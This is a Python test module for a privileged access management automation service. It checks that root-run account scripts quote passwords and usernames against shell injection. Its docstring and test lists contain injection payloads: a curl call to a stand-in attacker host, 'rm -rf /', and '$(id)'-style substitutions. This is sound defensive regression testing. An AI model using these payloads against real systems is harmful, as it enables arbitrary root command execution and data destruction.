"""No executor may interpolate an unquoted value into a privileged shell command.

The account executors built their scripts with f-strings and hand-written single
quotes:

    echo '{target_user}:{password}' | chpasswd

Those scripts run as root on every target host, and the values come from a vault
credential — admin-supplied and unvalidated. A password containing a single quote
closes the quote, and everything after it is a NEW COMMAND:

    echo 'svc:p4ss'; curl http://attacker/$(hostname) #' | chpasswd

That is an escalation from "may create a credential" to "arbitrary root execution
across the fleet", which in a PAM are very different privileges. It was reachable
from the ordinary credential-create form, not theoretical.

Two halves, because one alone would not have caught it:

  * a STRUCTURAL sweep — every f-string that looks like shell must have every
    interpolation wrapped in sh_quote(). This is what stops the next executor
    reintroducing it, in a file nobody thought to test.
  * an EXECUTABLE check — the builders are run with hostile input and the output
    inspected. A structural rule can be satisfied by quoting the wrong thing.
"""

from __future__ import annotations

import ast
import re
import shlex
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
AUTO = ROOT / "services/automation-service/app"
EXECUTORS = AUTO / "plugins/executors"
ACCOUNT_OPS = AUTO / "_account_ops.py"

# A string is checked when it FLOWS INTO A SHELL, not when it mentions shell
# words. Keyword matching flagged an error message that happened to contain the
# word "sudo" — a log line, never executed. Where a value ends up is the property
# that matters; what it looks like is not.
_SHELL_SINKS = re.compile(r"^(_?script|_?cmd|_?snippet|command)$")

_QUOTERS = {"sh_quote", "quote", "shlex.quote"}


def _quoter_name(node: ast.AST) -> str | None:
    if isinstance(node, ast.Call):
        f = node.func
        if isinstance(f, ast.Name):
            return f.id
        if isinstance(f, ast.Attribute):
            return f"{getattr(f.value, 'id', '')}.{f.attr}"
    return None


def _names_bound_to_quoters(fn: ast.AST) -> set[str]:
    """Locals assigned directly from a quoting call — `_u = sh_quote(user)`."""
    out: set[str] = set()
    for node in ast.walk(fn):
        if isinstance(node, ast.Assign) and len(node.targets) == 1 and isinstance(node.targets[0], ast.Name):
            if _quoter_name(node.value) in _QUOTERS:
                out.add(node.targets[0].id)
    return out


def _fstrings_in(node: ast.AST):
    """Every f-string reachable from an expression, PRUNING anything already
    inside a quoting call.

    sh_quote(f"{user}:{pass}") is safe by construction — the f-string builds the
    value, the quoter makes it one shell word. Walking into it reports the inner
    interpolations as unquoted, which is the opposite of the truth and would push
    someone to "fix" correct code.
    """
    found: list[ast.JoinedStr] = []

    def visit(n: ast.AST) -> None:
        if _quoter_name(n) in _QUOTERS:
            return                      # already safe; do not descend
        if isinstance(n, ast.JoinedStr):
            found.append(n)
        for child in ast.iter_child_nodes(n):
            visit(child)

    visit(node)
    return found


def _shell_bound_expressions(scope: ast.AST):
    """Expressions that become a shell command: assigned to a script/cmd name, or
    handed to sudo_exec()/run_command(command=...)."""
    out = []
    for node in ast.walk(scope):
        if isinstance(node, ast.Assign):
            for t in node.targets:
                if isinstance(t, ast.Name) and _SHELL_SINKS.match(t.id):
                    out.append(node.value)
        elif isinstance(node, ast.Call):
            fname = _quoter_name(node) or ""
            if fname.endswith("sudo_exec"):
                out.extend(node.args[1:2])
            for kw in node.keywords:
                if kw.arg == "command":
                    out.append(kw.value)
        elif isinstance(node, ast.Return) and node.value is not None:
            fn = getattr(scope, "name", "")
            if fn.endswith("_script") or fn.endswith("_snippet"):
                out.append(node.value)
    return out


def _shell_fstrings(path: Path):
    """(lineno, unquoted-interpolation-source) for every value that reaches a shell."""
    src = path.read_text()
    tree = ast.parse(src)
    problems = []
    scopes = [n for n in ast.walk(tree) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))] or [tree]
    for scope in scopes:
        safe_names = _names_bound_to_quoters(scope)
        for expr in _shell_bound_expressions(scope):
            for js in _fstrings_in(expr):
                for part in js.values:
                    if not isinstance(part, ast.FormattedValue):
                        continue
                    inner = part.value
                    if _quoter_name(inner) in _QUOTERS:
                        continue
                    if _quoter_name(inner) in _QUOTERS:
                        continue
                    if isinstance(inner, ast.Name) and inner.id in safe_names:
                        continue
                    problems.append((js.lineno, ast.get_source_segment(src, inner) or "?"))
    return problems


def _targets() -> list[Path]:
    return sorted([*EXECUTORS.glob("*.py"), ACCOUNT_OPS])


def test_sweep_finds_files():
    """Guard against the parametrisation below being empty."""
    files = _targets()
    assert len(files) >= 5, f"only found {[f.name for f in files]}"
    assert any(f.name == "account_push.py" for f in files)


@pytest.mark.parametrize("path", _targets(), ids=lambda p: p.name)
def test_no_unquoted_interpolation_into_shell(path: Path):
    problems = _shell_fstrings(path)
    assert not problems, (
        f"{path.name} interpolates unquoted values into a command that runs as root:\n  "
        + "\n  ".join(f"line {ln}: {{{expr}}}" for ln, expr in problems)
        + "\nWrap each in sh_quote()."
    )


# ── executable half: run the builders against hostile input ──────────────────

def _load_helpers():
    src = ACCOUNT_OPS.read_text()
    start = src.index("class UnsafeAccountValue")
    end = src.index("# op -> shell snippet builder")
    ns: dict = {"re": re, "shlex": shlex}
    # Everything from the helpers down to the first async def — which is where the
    # httpx-dependent code starts. An earlier slice stopped short of _op_snippet
    # and every test that used it failed with KeyError rather than a real result.
    tail = re.search(r"^async def ", src[start:], re.M)
    body = src[start: start + tail.start()] if tail else src[start:]
    exec(compile(body, "<helpers>", "exec"), ns)
    assert "_op_snippet" in ns and "chpasswd_script" in ns, "helper load missed a builder"
    return ns


H = _load_helpers()

_HOSTILE = [
    "p4ss'; curl http://attacker/$(hostname) #",
    "x' ; rm -rf / ; echo '",
    'quote"and`backtick`',
    "newline\ninjected",
    "$(id)",
    "`id`",
]


@pytest.mark.parametrize("password", _HOSTILE)
def test_chpasswd_keeps_a_hostile_password_as_one_argument(password: str):
    script = H["chpasswd_script"]("svcuser", password)
    # The whole user:password pair must survive as a SINGLE shell word.
    words = shlex.split(script.split("|")[0])
    assert words[0] == "printf"
    assert words[-1] == f"svcuser:{password}", (
        f"password was not preserved as one argument: {words[-1]!r}"
    )
    # And nothing may have become a second command.
    assert ";" not in script.replace(shlex.quote(f"svcuser:{password}"), "")


@pytest.mark.parametrize("username", ["; rm -rf /", "a'b", "root\nx", "", "-flag", "u" * 40])
def test_hostile_usernames_are_refused_outright(username: str):
    """Quoting alone would pass these through as literal account names — safe, but
    absurd. They should fail at the boundary, not create nonsense on fifty hosts."""
    with pytest.raises(H["UnsafeAccountValue"]):
        H["validate_username"](username)


@pytest.mark.parametrize("op", ["disable", "remove"])
def test_op_snippets_quote_the_username(op: str):
    snippet = H["_op_snippet"](op, "svcuser")
    assert "svcuser" in snippet
    # a hostile name never reaches snippet construction
    with pytest.raises(H["UnsafeAccountValue"]):
        H["_op_snippet"](op, "a'; id; echo '")


def test_unknown_op_is_refused():
    with pytest.raises(H["UnsafeAccountValue"]):
        H["_op_snippet"]("delete_everything", "svcuser")
